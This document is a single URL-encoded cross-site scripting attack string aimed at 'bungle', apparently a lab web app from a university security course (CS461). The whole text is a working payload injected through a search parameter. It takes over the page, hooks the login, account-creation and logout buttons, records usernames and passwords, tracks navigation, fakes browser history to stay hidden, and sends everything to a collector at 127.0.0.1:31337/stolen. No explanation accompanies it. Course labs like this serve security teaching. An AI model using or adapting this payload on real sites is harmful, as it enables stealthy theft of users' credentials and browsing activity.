http://bungle-cs461.cs.illinois.edu/./search?xssdefense=2&q=%3Cimg%20src%3Dx%20onerror%3D'function%20payload(attacker)%20%7B%0A%09var%20CurrentTitle%3B%0A%09var%20CurrentPage%3B%0A%09var%20CurrentUser%3B%09%0Afunction%20log(data)%20%7B%0A%0A%09%20%20%20%20console.log(%24.param(data))%3B%0A%09%20%20%20%20%24.get(attacker%2Cdata)%3B%0A%7D%0Afunction%20PageInjection()%7B%0A%09%0A%09var%20usernamevalue%3D%24(%22%23username%22)%5B0%5D%3B%20%0A%09var%20password%3D%24(%22%23userpass%22)%5B0%5D%3B%0A%09%24(%22.form-inline%22).attr(%22onsubmit%22%2C%22return%20false%22)%3B%0A%09var%20ButtonLogIn%3D%24(%22%23log-in-btn%22)%3B%0A%09if(ButtonLogIn)%7B%0A%09%20%20%20%20ButtonLogIn.click(function(e)%7B%0A%09%20%20%20%20%20%20%20%20console.log(%22log%20in%20requested%22)%3B%0A%09%20%20%20%20%20%20%20%20%24.post(%22.%2Flogin%22%2C%0A%09%20%20%20%20%7Busername%3Ausernamevalue.value%2C%0A%09%20%20%20%20password%3Apassword.value%7D)%0A%09%20%20%20%20.done(function(data)%7B%0A%09%20%20%20%20%09CurrentUser%3Dusernamevalue.value%3B%09%0A%09%09%20%20%20%20log(%7Bevent%3A%22login%22%2Cuser%3ACurrentUser%2Cpass%3Apassword.value%7D)%3B%0A%09%20%20%20%20HistoryUpdate()%3B%0A%09%20%20%20%20PageUpdate(data%2C%22Bungle!%22%2C%22.%2F%22)%3B%0A%09%20%20%20%20e.preventDefault()%3B%7D)%0A%09%7D)%3B%7D%0A%09var%20ButtonCreateAccount%3D%24(%22%23new-account-btn%22)%3B%0A%09if(ButtonCreateAccount)%7B%0A%09ButtonCreateAccount.click(function(e)%7B%0A%09%20%20%20%20console.log(%22account%20created%22)%3B%0A%09%20%20%20%20%24.post(%22.%2Fcreate%22%2C%0A%09%09%7Busername%3Ausernamevalue.value%2C%0A%09%20%09%20password%3Apassword.value%7D)%0A%09%20%20%20%20.done(function(data)%7B%0A%09%20%20%20%20%09CurrentUser%3Dusernamevalue.value%3B%09%0A%09%09log(%7Bevent%3A%22login%22%2Cuser%3ACurrentUser%2Cpass%3Apassword.value%7D)%3B%0A%09%20%20%20%20HistoryUpdate()%3B%0A%09%20%20%20%20PageUpdate(data%2C%22Bungle!%22%2C%22.%2F%22)%3B%0A%09%20%20%20%20e.preventDefault()%3B%0A%09%7D)%0A%09%7D)%3B%0A%09%7D%0A%09var%20ButtonLogOut%3D%24(%22%23log-out-btn%22)%3B%0A%09if(ButtonLogOut)%7B%0A%09ButtonLogOut.click(function(e)%7B%0A%09%20%20%20%20%24.post(%22.%2Flogout%22)%0A%09%20%20%20%20.done(function(data)%7B%09%0A%09%20%20%20%20log(%7Bevent%3A%22logout%22%2Cuser%3ACurrentUser%7D)%3B%0A%09%20%20%20%20CurrentUser%3D%22%22%0A%09%20%20%20%20HistoryUpdate()%3B%0A%09%20%20%20%20PageUpdate(data%2C%22Bungle!%22%2C%22.%2F%22)%3B%0A%09%20%20%20%20e.preventDefault()%3B%0A%09%7D)%0A%0A%09%7D)%3B%09ButtonLogOut.attr(%22onsubmit%22%2C%22return%20false%22)%3B%0A%09%7D%0A%09var%20bunglelink%3D%24(%22%23bungle-lnk%22)%3B%0A%09if(bunglelink)%7B%0A%09bunglelink.removeAttr(%22href%22)%3B%0A%09bunglelink.click(function(e)%7B%0A%09%24.get(%22.%2F%22)%0A%09%20%20%20%20.done(function(data)%7B%0A%09%09HistoryUpdate()%3B%0A%09%09PageUpdate(data%2C%22Bungle!%22%2C%22.%2F%22)%3B%0A%09%09e.preventDefault()%3B%7D)%3B%0A%09%7D)%3B%0A%09%7D%0A%09var%20ButtonSearch%3D%24(%22%23search-btn%22)%3B%0A%09var%20query%3D%24(%22%23query%22)%5B0%5D%3B%0A%09if(ButtonSearch)%7B%0A%09%20%20%20%20ButtonSearch.click(function(e)%7B%0A%09%20%20%20%20var%20urls%3D%22.%2Fsearch%3Fq%3D%22%2Bquery.value%3B%0A%09%20%20%20%20%24.get(urls)%0A%09%20%20%20%20.done(function(data)%7B%0A%09%09HistoryUpdate()%3B%0A%09%09PageUpdate(data%2C%22Search%20Results%22%2Curls)%3B%0A%09%09e.preventDefault()%3B%7D)%3B%0A%09%7D)%3B%0A%09ButtonSearch.attr(%22onsubmit%22%2C%22return%20false%22)%3B%7D%0A%09var%20ButtonSearchAgain%3D%24(%22%23search-again-btn%22)%3B%0A%09if(ButtonSearchAgain)%7B%0A%09ButtonSearchAgain.removeAttr(%22href%22)%3B%0A%09ButtonSearchAgain.click(function(e)%7B%0A%09%09%24.get(%22.%2F%22)%0A%09%09.done(function(data)%7B%0A%09%09HistoryUpdate()%3B%0A%09%09PageUpdate(data%2C%22Bungle!%22%2C%22.%2F%22)%3B%0A%09%09e.preventDefault()%3B%7D)%3B%0A%09%7D)%3B%0A%09%7D%0A%09%24(%22.history-item%22).removeAttr(%22href%22)%3B%0A%09%24.each(%24(%22.history-item%22)%2Cfunction()%7B%0A%09%24(this).click(function(e)%7B%0A%09%09var%20urls%3D%22.%2Fsearch%3Fq%3D%22%2Bthis.text()%3B%0A%09%24.get(urls)%0A%09.done(function(data)%7B%0A%09%09HistoryUpdate()%3B%0A%09%09updateCurrentPage(data%2C%22Search%20Results%22%2Curls)%3B%0A%09%09e.preventDefault()%7D)%3B%0A%09%7D)%3B%0A%09console.log(%24(this).text())%3B%0A%09if(%24(this).text().includes(%22payload%22))%0A%09%09%24(this).remove()%3B%0A%09%7D)%3B%0A%7D%0Afunction%20PageUpdate(NewHtml%2CNewTitle%2CNewPage)%7B%0A%09%24(%22body%22).html(NewHtml)%3B%0A%09CurrentTitle%3DNewTitle%3B%0A%09Currentpage%3DNewPage%3B%0A%09var%20data%3D%7B%0A%09%22html%22%3A%24(%22body%22).html()%2C%0A%09%22title%22%3ACurrentTitle%2C%0A%09%22page%22%3ACurrentpage%0A%09%7D%0A%09window.history.replaceState(data%2CCurrentTitle%2CCurrentpage)%3B%0A%09%24(%22title%22)%5B0%5D.text%3DCurrentTitle%3B%0A%09PageInjection()%3B%0A%09LogPage()%3B%0A%7D%0Afunction%20HistoryUpdate()%7B%0A%09var%20data%3D%7B%0A%09%22html%22%3A%24(%22body%22).html()%2C%0A%09%22title%22%3ACurrentTitle%2C%0A%09%22page%22%3ACurrentpage%0A%09%7D%0A%09window.history.pushState(data%2CCurrentTitle%2CCurrentpage)%3B%0A%7D%0A%09function%20LogPage()%7B%0A%09var%20path%3Dwindow.location.href%3B%0A%09log(%7Bevent%3A%22nav%22%2Cuser%3ACurrentUser%2Curl%3Apath%7D)%3B%0A%09%7D%0A%09function%20proxy(href)%20%7B%09%20%20%20%20%0A%09%24(%22body%22).load(href%2Cfunction()%7B%0A%09PageUpdate(%24(%22body%22).html()%2C%22Bungle!%22%2C%22.%2F%22)%3B%0A%09window.onpopstate%3Dfunction(event)%7B%0A%09var%20html%20%3D%20event.state%5B%22html%22%5D%3B%0A%09var%20title%3D%20event.state%5B%22title%22%5D%3B%0A%09var%20page%20%3D%20event.state%5B%22page%22%5D%3B%0A%09PageUpdate(html%2Ctitle%2Cpage)%3B%20%7D%3B%0A%09%7D)%3B%0A%7D%0A%09%24(%22body%22).empty()%3B%0A%09proxy(%22.%2F%22)%3B%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B'%3C%2Fimg%3E
